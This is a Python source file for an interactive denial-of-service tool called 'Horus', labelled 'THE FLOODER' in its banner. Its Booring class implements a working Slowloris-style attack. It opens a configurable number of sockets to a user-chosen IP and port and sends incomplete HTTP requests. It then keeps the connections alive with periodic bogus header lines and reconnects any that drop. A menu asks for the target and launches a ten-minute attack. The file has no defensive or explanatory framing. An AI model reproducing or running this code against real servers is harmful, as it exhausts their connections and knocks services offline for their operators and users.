import sys, aiohttp, time, socket, random
from termcolor import colored as c
from colorama import init as colorinit
colorinit()
class Misc:
    def __init__(self):
        self.BANNER =(rf"""
             .                                                      .
           .n                   .                 .                  n.
     .   .dP                  dP                   9b                 9b.    .
    4    qXb         .       dX                     Xb       .        dXp     t
   dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
   9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
    9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
     `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
       `9XXXXXXXXXXXP' `9XX'          `98v8P'         `XXP' `9XXXXXXXXXXXP'
           ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                           )b.  .dbo.dP'`v'`9b.odb.  .dX(
                         ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                        dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                       dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                       9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                        `'      9XXXXXX(   )XXXXXXP      `'
                                 XXXX X.`v'.X XXXX
                                 XP^X'`b   d'`X^XX
                                 X. 9  `   '  P )X
                                 `b  `       '  d'
                                  `             '
                                    :                               
                                   t#,               :             .
                    .    .        ;##W.   j.         Ef           ;W
                    Di   Dt      :#L:WE   EW,        E#t         f#E
                    E#i  E#i    .KG  ,#D  E##j       E#t       .E#f 
                    E#t  E#t    EE    ;#f E###D.     E#t      iWW;  
                    E#t  E#t   f#.     t#iE#jG#W;    E#t fi  L##Lffi
                    E########f.:#G     GK E#t t##f   E#t L#jtLLG##L 
                    E#j..K#j... ;#L   LW. E#t  :K#E: E#t L#L  ,W#i  
                    E#t  E#t     t#f f#:  E#KDDDD###iE#tf#E: j#E.   
                    E#t  E#t      f#D#;   E#f,t#Wi,,,E###f .D#j     
                    f#t  f#t       G#t    E#t  ;#W:  E#K, ,WK,      
                     ii   ii        t     DWi   ,KK: EL   EG.       
                                                     :    ,         
                               ---- THE FLOODER ----
                                    | S3R43o3 |""")

class Booring():
    def __init__(self, ip, port=80, socketsCount = 200):
        self._ip = ip
        self._port = port
        self._headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ]
        self._sockets = [self.newSocket() for _ in range(socketsCount)]

    def getMessage(self, message):
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")
    
    def newSocket(self):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self._ip, self._port))
                s.send(self.getMessage("Get /?"))
                for header in self._headers:
                    s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
                return s
            except socket.error as se:
                print("Error: "+str(se))
                time.sleep(0.5)
                return self.newSocket()

    def attack(self, timeout=sys.maxsize, sleep=15):
        t, i = time.time(), 0
        while(time.time() - t < timeout):
            for s in self._sockets:
                try:
                    print(c("[*] Horus: Sending request #{}",'blue', attrs=['bold']).format(str(i)), end="\r")
                    s.send(self.getMessage("X-a: "))
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep/len(self._sockets))

class Horus():
    def __init__(self):
        self.default_ip = "192.168.178.56"
        self.default_port = 80
        self.attackip = ""
        self.attackport = 0
        self.printBanner = True
        self.default_socketCount = 200
        self.socket_count = 0
        self.misc = Misc()
        self.s = None
        
        self.horusMenu()
    

    def run(self):
        print(c("[*] Horus: Starting Attack on "+str(self.attackip)+"... (PRESS CTRL+C to Cancel)", "blue", attrs=["bold"]))
        self.dos = Booring(self.attackip, int(self.attackport), int(self.socket_count))
        self.dos.attack(timeout=60*10)



    def horusMenu(self):
        try:
            self.menu = (rf""" 
            [1] Run Horus
            [2] Check Settings
            
            [0] Exit
                
                """)
            options = {
                1:"Run Horus",
                2:"Check Settings",
                0:"Exit"
            }
            if self.printBanner == False:
                self.printBanner = True
                print("")
            else:
                print(c("\n"+self.misc.BANNER+"\n"+self.menu, 'red', attrs=['bold']))

            choice = (input(c("[*] Select Option: ", "yellow", attrs=["bold"])))
            if choice =="":
                print(c("[!] Horus Error: Invalid Option", "magenta", attrs=["bold"]))
                time.sleep(2.0)
                return self.horusMenu()
            choice = int(choice)
            if choice not in options:
                print(c(f"[!] Horus Error: Invalid Option", "magenta", attrs=["bold"]), end='\r')
                time.sleep(2.0)
                return self.horusMenu()
            elif int(choice) == 1:
                self.horusSetup()
            elif int(choice) == 2:
                self.printBanner = False
                self.showSetting()
                
            elif int(choice) == 0:
                sys.exit(0)
        except KeyboardInterrupt:
            sys.exit(0)

    def showSetting(self):
        currentSettings = (rf"""
    [*] Horus: Attack-IP: {self.attackip}
    [*] Horus: Attack-Port: {self.attackport}

        """)
        print(c(currentSettings, "red", attrs=["bold"]), end='\r')
        return self.horusMenu()

    def horusSetup(self):        
        try:
            print(c('\n\n[*] Horus: Setup starting...', 'blue', attrs=['bold']))
            print(c("______________________________________________________________________\n\n", "blue", attrs=["bold"]))
            time.sleep(0.6)
            ip = input(c(f'[*] Enter IP: ','yellow',attrs=['bold']))
            if ip == "":
                print(c(f"[*] Horus: No Attack-IP entered, using default IP!", "blue", attrs=["bold"]))
                self.attackip = self.default_ip
                time.sleep(1.4)
            else:
                self.attackip = str(ip)
                print(c(f"[*] Horus: Attack-IP entered,  using IP: "+str(self.attackip)+"!", "blue", attrs=["bold"])) 

            port = input(c(f'[*] Enter Port: ', 'yellow', attrs=['bold']))
            if port == "":
                print(c(f"[*] Horus: No Attack-Port entered, using default Port!", "blue", attrs=["bold"]))
                self.attackport = self.default_port
                time.sleep(1.4)
            else:
                self.attackport = int(port)
                print(c("[*] Horus: Attack-Port entered, using Port: "+str(self.attackport)+" !", "blue", attrs=["bold"])) 

            socketsize = input(c(f'[*] How many sockets you need?: ', 'yellow', attrs=['bold']))
            if socketsize == "":
                self.socket_count = int(self.default_socketCount)
                print(c(f"[*] Horus: No Socket-Size entered, using default socket count "+str(self.default_socketCount)+"!", "blue", attrs=["bold"])) 
                time.sleep(1.4)
            else:
                self.socket_count = int(socketsize)
                print(c(f"[*] Horus: Socket-Size entered, using "+ str(self.socket_count)+ " sockets!", "blue", attrs=["bold"])) 
            
            # attacktimeout = input(c(f'[*] Enter Attack-Timeout: ', 'yellow', attrs=['bold']))
            # if attacktimeout == "":
            #     self.attacktimeout = self.default_timeout
            #     print(c(f"[*] Horus: No Attack-Timeout entered, using default Timeout:" + str(self.attacktimeout) + " !", "blue", attrs=["bold"])) 
            #     time.sleep(1.4)
            # else:
            #     self.attacktimeout = float(attacktimeout)
            #     print(c(f"[*] Horus: Attack-Timeout entered, using Timeout:"+str(self.attacktimeout) +"", "blue", attrs=["bold"]))
            print(c("\n______________________________________________________________________", "red", attrs=["bold"]))

            checkMenu =(fr"""
            [*] Horus: Attack-IP: {self.attackip}
            [*] Horus: Attack-Port: {self.attackport}

                    Do yow want launch the attack?
                                ([Y/n])
            """)
            print(c(checkMenu, 'red', attrs=['bold']))
            choice = input(c("[*] Select Option: ", "yellow", attrs=["bold"]))
            if choice == "Y" or choice == "y":
                self.run()
            elif choice == "n" or choice == "N":
                print(c("[*] Horus: Attack aborted!", "blue", attrs=["bold"]))
                time.sleep(1.4)
                self.horusMenu()
            else:
                print(c("[!] Horus Error: Invalid Option", "magenta", attrs=["bold"]))
                time.sleep(2.0)
                self.horusMenu()
        except KeyboardInterrupt:
            sys.exit(0)

if __name__ == '__main__':
    horus = Horus()
    try:
        horus.horusMenu()
    except KeyboardInterrupt:
        sys.exit(0)
    finally:
        if horus.s != None:
            horus.s.close()
        sys.exit(0)